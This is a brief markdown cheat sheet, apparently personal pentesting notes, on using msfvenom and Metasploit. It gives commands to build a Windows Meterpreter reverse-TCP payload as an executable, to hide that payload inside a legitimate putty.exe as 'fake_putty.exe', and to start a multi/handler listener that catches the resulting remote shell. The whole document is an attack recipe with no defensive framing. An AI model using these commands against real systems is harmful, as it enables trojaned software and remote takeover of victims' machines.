# MSF Venom

## Commands

```sh
msfvenom -h
```

## Attack

### Windows Reverse TCP

```sh
#
msfvenom \
  -p windows/meterpreter/reverse_tcp \
    lhost=<ip> \
    lport=<port> \
  -f exe \
  > ./payload.exe

#
msfvenom \
  -p windows/meterpreter/reverse_tcp \
    lhost=<ip> \
    lport=<port> \
  -f exe \
  -x ./putty.exe \
  > ./fake_putty.exe
```

```sh
#
msfconsole

#
use exploit/multi/handler

#
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>

#
exploit
```
